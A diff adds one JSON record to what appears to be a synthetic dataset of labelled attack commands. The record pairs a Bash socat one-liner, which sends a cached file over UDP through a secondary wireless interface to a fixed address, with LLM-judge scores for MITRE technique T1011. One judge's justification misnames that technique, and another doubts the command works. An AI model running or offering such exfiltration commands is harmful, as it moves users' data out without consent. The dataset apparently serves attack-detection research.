@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1011",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "iwconfig wlan1 >/dev/null 2>&1 && socat -u FILE:/home/user/.cache/k.bin UDP4-SENDTO:10.55.88.7:49401,interface=wlan1",
+  "explanation": "Uses socat to send a file via UDP bound explicitly to wlan1, leveraging a separate wireless medium in line with T1011.",
+  "rationale_steps": [
+    "Confirm wlan1 presence via iwconfig without making changes.",
+    "Select the outbound interface explicitly (wlan1) to ensure off-path exfiltration.",
+    "Use UDP on a non-standard port for a single-shot transfer with minimal system impact."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-621a2eda-c920e182",
+  "source_prompt_hash": "621a2eda",
+  "timestamp_utc": "2025-09-30T08:26:15.681023Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The bash command is well-formed with correct redirections, logical operator usage, and parseable socat address syntax.",
+        "semantic_score": 3,
+        "semantic_justification": "While socat can exfiltrate a file via UDP, the 'interface=wlan1' option is likely not valid for UDP4-SENDTO (binding typically needs so-bindtodevice with elevated privileges), so it may not actually force use of wlan1 and could fail or route via the default interface.",
+        "combined_score": 4.0,
+        "confidence": 0.6,
+        "timestamp": "2025-10-01T02:33:45.965765Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper command separators (&&), valid flags, correct redirection syntax (>/dev/null 2>&1), and appropriate parameter formatting for the socat utility.",
+        "semantic_score": 5,
+        "semantic_justification": "The command fully aligns with T1011 (Automated Exfiltration) as it first checks if wlan1 interface exists and then uses socat to exfiltrate a file (/home/user/.cache/k.bin) over UDP to a specific IP address (10.55.88.7) and port (49401) through a secondary wireless interface.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T02:33:49.527875Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, using valid Linux commands, standard redirections, logical operators, and correctly structured socat arguments and address specifications.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly achieves the claimed intent by using `socat` to send a specified file via UDP to an external IP, explicitly leveraging a wireless interface (`wlan1`), which aligns with automated exfiltration over an alternative protocol and medium as described in T1011.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T02:34:00.764808Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.667,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
